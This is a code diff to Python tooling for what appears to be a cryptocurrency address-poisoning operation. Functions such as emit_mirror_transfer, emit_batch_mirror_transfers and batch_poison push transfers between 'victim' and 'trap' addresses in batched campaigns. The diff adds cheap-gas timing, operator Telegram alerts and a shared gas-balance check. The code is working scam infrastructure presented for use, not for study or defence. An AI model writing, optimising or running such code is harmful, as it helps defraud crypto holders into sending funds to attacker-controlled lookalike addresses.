@@ -501,9 +501,47 @@ def get_explorer_url(address, link_type='address'):
     return f"{base_url}/address/{address}#tokentxns"
 
 
-def get_smart_gas_params(w3, context="[gas-strategy]"):
+def notify_gas_strategy(campaign_id, used_fallback, final_gwei):
+    """Send a Telegram notification about which gas strategy was used."""
+    try:
+        if used_fallback:
+            msg = (
+                f"⚠️ *Gas Strategy: Fallback Used*\n\n"
+                f"The network stayed congested for 10 minutes.\n\n"
+                f"⛽ *Firing at Market Rate:* `{final_gwei:.2f} Gwei`\n\n"
+                f"💡 _This ensures your nonces don't get stuck, but costs slightly more._"
+            )
+            send_telegram(msg, campaign_id=campaign_id)
+        else:
+            msg = (
+                f"✅ *Gas Strategy: Cheap Gas Sniped!*\n\n"
+                f"The network is currently uncongested.\n\n"
+                f"⛽ *Firing at Cheap Rate:* `{final_gwei:.2f} Gwei`\n\n"
+                f"💰 _Saving you money on this batch!_"
+            )
+            send_telegram(msg, campaign_id=campaign_id)
+    except Exception as e:
+        logger.warning(f"[gas-strategy] Failed to send gas notification: {e}")
+
+def check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, context):
+    """Checks if operator has enough balance for gas. Returns True if OK, False if insufficient."""
+    operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+    gas_price = gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
+    gas_cost = estimated_gas * gas_price
+    
+    if operator_balance < gas_cost:
+        needed_eth = float(w3.from_wei(gas_cost, 'ether'))
+        have_eth = float(w3.from_wei(operator_balance, 'ether'))
+        shortfall = needed_eth - have_eth
+        logger.error(f"[{context}] Insufficient gas. Need {needed_eth}, have {have_eth}")
+        send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context=context)
+        return False
+    return True    
+
+
+def get_smart_gas_params(w3, context="[gas-strategy]", campaign_id=None):
     """
-    Smart Gas Strategy: Wait for cheap gas (1.5 Gwei), but fallback to spot price 
+    Smart Gas Strategy: Wait for cheap gas (0.5 Gwei), but fallback to spot price 
     if it takes longer than 10 minutes to prevent stuck nonces.
     """
     default_max_fee = w3.to_wei(2, 'gwei')
@@ -512,51 +550,61 @@ def get_smart_gas_params(w3, context="[gas-strategy]"):
     target_max_fee = w3.to_wei(0.5, 'gwei')
     network_tip = w3.to_wei(0.01, 'gwei')
     
+    used_fallback = False
+    final_gwei = 0.0
+    
     try:
         latest_block = call_with_retry(w3.eth.get_block, "latest")
         base_fee = latest_block.get("baseFeePerGas", 0) or 0
         base_fee_gwei = float(w3.from_wei(base_fee, 'gwei'))
         target_gwei = float(w3.from_wei(target_max_fee, 'gwei'))
+        final_gwei = base_fee_gwei
         
         if base_fee <= target_max_fee:
             final_max_fee = base_fee + network_tip
             logger.info(f"{context} ✅ Base fee is cheap ({base_fee_gwei:.2f} Gwei). Firing immediately!")
-            return {'maxFeePerGas': final_max_fee, 'maxPriorityFeePerGas': network_tip}
-        
-        logger.info(f"{context} ⏳ Base fee is {base_fee_gwei:.2f} Gwei. Waiting up to 10 mins for it to drop to <{target_gwei} Gwei...")
-        
-        gas_dropped = False
-        for i in range(50): # 50 blocks * 12s = 10 mins
-            time.sleep(12)
+        else:
+            logger.info(f"{context} ⏳ Base fee is {base_fee_gwei:.2f} Gwei. Waiting up to 10 mins for it to drop to <{target_gwei} Gwei...")
             
-            try:
-                current_block = call_with_retry(w3.eth.get_block, "latest")
-                current_base_fee = current_block.get("baseFeePerGas", 0) or 0
-                current_gwei = float(w3.from_wei(current_base_fee, 'gwei'))
+            gas_dropped = False
+            for i in range(50): # 50 blocks * 12s = 10 mins
+                time.sleep(12)
                 
-                if current_base_fee <= target_max_fee:
-                    final_max_fee = current_base_fee + network_tip
-                    gas_dropped = True
-                    logger.info(f"{context} ✅ Base fee dropped to {current_gwei:.2f} Gwei! Firing at cheap rate!")
+                try:
+                    current_block = call_with_retry(w3.eth.get_block, "latest")
+                    current_base_fee = current_block.get("baseFeePerGas", 0) or 0
+                    current_gwei = float(w3.from_wei(current_base_fee, 'gwei'))
+                    final_gwei = current_gwei
+                    
+                    if current_base_fee <= target_max_fee:
+                        final_max_fee = current_base_fee + network_tip
+                        gas_dropped = True
+                        logger.info(f"{context} ✅ Base fee dropped to {current_gwei:.2f} Gwei! Firing at cheap rate!")
+                        break
+                    
+                    if i % 5 == 0:
+                        logger.info(f"{context} ⏳ Still waiting... Current base fee: {current_gwei:.2f} Gwei")
+                except Exception as e:
+                    logger.warning(f"{context} Failed to check base fee: {e}")
                     break
-                
-                if i % 5 == 0:
-                    logger.info(f"{context} ⏳ Still waiting... Current base fee: {current_gwei:.2f} Gwei")
-            except Exception as e:
-                logger.warning(f"{context} Failed to check base fee: {e}")
-                break
-                
-        if not gas_dropped:
-            try:
-                fallback_block = call_with_retry(w3.eth.get_block, "latest")
-                fallback_base_fee = fallback_block.get("baseFeePerGas", base_fee) or base_fee
-                final_max_fee = fallback_base_fee + network_tip
-                fallback_gwei = float(w3.from_wei(fallback_base_fee, 'gwei'))
-                logger.warning(f"{context} ⚠️ Gas stayed high for 10 mins. Firing at current market rate ({fallback_gwei:.2f} Gwei) to prevent stuck nonces.")
-            except Exception as e:
-                final_max_fee = base_fee + network_tip
-                logger.warning(f"{context} ⚠️ Gas check failed. Firing at original base fee.")
-                
+                    
+            if not gas_dropped:
+                used_fallback = True
+                try:
+                    fallback_block = call_with_retry(w3.eth.get_block, "latest")
+                    fallback_base_fee = fallback_block.get("baseFeePerGas", base_fee) or base_fee
+                    final_max_fee = fallback_base_fee + network_tip
+                    fallback_gwei = float(w3.from_wei(fallback_base_fee, 'gwei'))
+                    final_gwei = fallback_gwei
+                    logger.warning(f"{context} ⚠️ Gas stayed high for 10 mins. Firing at current market rate ({fallback_gwei:.2f} Gwei) to prevent stuck nonces.")
+                except Exception as e:
+                    final_max_fee = base_fee + network_tip
+                    logger.warning(f"{context} ⚠️ Gas check failed. Firing at original base fee.")
+                    
+        # 🚀 Send Telegram Notification
+        if campaign_id:
+            notify_gas_strategy(campaign_id, used_fallback, final_gwei)
+            
         return {'maxFeePerGas': final_max_fee, 'maxPriorityFeePerGas': network_tip}
         
     except Exception as e:
@@ -613,9 +661,11 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
 
         gas_params = {}
         if use_eip1559:
-            gas_params = get_smart_gas_params(w3, context="[mirror]")
+            gas_params = get_smart_gas_params(w3, context="[mirror]", campaign_id=campaign_id)
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+
+        estimated_gas = 80000 # 🚀 Increased buffer to match re_poison.js
 
         tx = contract.functions.transferFrom(
             w3.to_checksum_address(victim_address),
@@ -624,23 +674,14 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
         ).build_transaction({
             'from': operator_addr,
             'nonce': nonce,
-            'gas': 60000,
+            'gas': estimated_gas,
             'chainId': w3.eth.chain_id,
             **gas_params
         })
 
-        # Check operator has enough native for gas
-        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
-        gas_cost = 60000 * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
-        if operator_balance < gas_cost:
-            needed_eth = float(w3.from_wei(gas_cost, 'ether'))
-            have_eth = float(w3.from_wei(operator_balance, 'ether'))
-            shortfall = needed_eth - have_eth
-            
-            logger.error(f"[mirror] Operator {operator_addr} has insufficient gas. Need {needed_eth}, have {have_eth}")
-            send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Single Mirror")
+        # 🚀 DRY Refactor: Use shared balance checker
+        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "mirror"):
             return None
-
         signed = w3.eth.account.sign_transaction(tx, operator_key)
         raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
         tx_hash = w3.eth.send_raw_transaction(raw_tx)
@@ -703,14 +744,12 @@ def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
         
         gas_params = {}
         if use_eip1559:
-            gas_params = get_smart_gas_params(w3, context="[batch-mirror]")
+            gas_params = get_smart_gas_params(w3, context="[batch-mirror]", campaign_id=campaign_id)
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
         
-                # 🚀 ROUTER GAS FIX: Increased buffer for external calls and routing overhead
         estimated_gas = 50000 + (15000 * len(victims))
         
-        # Convert to checksum addresses
         victims_checksum = [w3.to_checksum_address(v) for v in victims]
         traps_checksum = [w3.to_checksum_address(t) for t in traps]
         
@@ -726,16 +765,8 @@ def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
             **gas_params
         })
         
-        # Check operator balance
-        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
-        gas_cost = estimated_gas * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
-        
-        if operator_balance < gas_cost:
-            needed_eth = float(w3.from_wei(gas_cost, 'ether'))
-            have_eth = float(w3.from_wei(operator_balance, 'ether'))
-            shortfall = needed_eth - have_eth
-            logger.error(f"[batch-mirror] Insufficient gas. Need {needed_eth}, have {have_eth}")
-            send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Batch Mirror")
+        # 🚀 DRY Refactor: Use shared balance checker
+        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "batch-mirror"):
             return None
         
         signed = w3.eth.account.sign_transaction(tx, operator_key)
@@ -828,11 +859,10 @@ def emit_multi_token_batch_transfers(queue, campaign_id):
         
         gas_params = {}
         if use_eip1559:
-            gas_params = get_smart_gas_params(w3, context="[multi-batch]")
+            gas_params = get_smart_gas_params(w3, context="[multi-batch]", campaign_id=campaign_id)
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
             
-                # 🚀 ROUTER GAS FIX: Increased buffer for external calls and routing overhead
         estimated_gas = 50000 + (15000 * total_transfers)
         
         tx = router_contract.functions.transfer(calls).build_transaction({
@@ -843,15 +873,8 @@ def emit_multi_token_batch_transfers(queue, campaign_id):
             **gas_params
         })
         
-        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
-        gas_cost = estimated_gas * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
-        
-        if operator_balance < gas_cost:
-            needed_eth = float(w3.from_wei(gas_cost, 'ether'))
-            have_eth = float(w3.from_wei(operator_balance, 'ether'))
-            shortfall = needed_eth - have_eth
-            logger.error(f"[multi-batch] Insufficient gas. Need {needed_eth}, have {have_eth}")
-            send_insufficient_gas_alert(operator_addr, needed_eth, have_eth, shortfall, campaign_id, context="Multi-Token Batch")
+        # 🚀 DRY Refactor: Use shared balance checker
+        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "multi-batch"):
             return None
             
         signed = w3.eth.account.sign_transaction(tx, operator_key)
@@ -1460,7 +1483,7 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
     if job_id:
         update_job(job_id, total=total)
         
-      # 🚀 BATCH PROCESSING: 700 items per multi-token batch to minimize gas fees
+          # 🚀 BATCH PROCESSING: 500 items per multi-token batch to minimize gas fees
     BATCH_SIZE = 500
     
     # 🚀 Send "Started" Telegram notification immediately
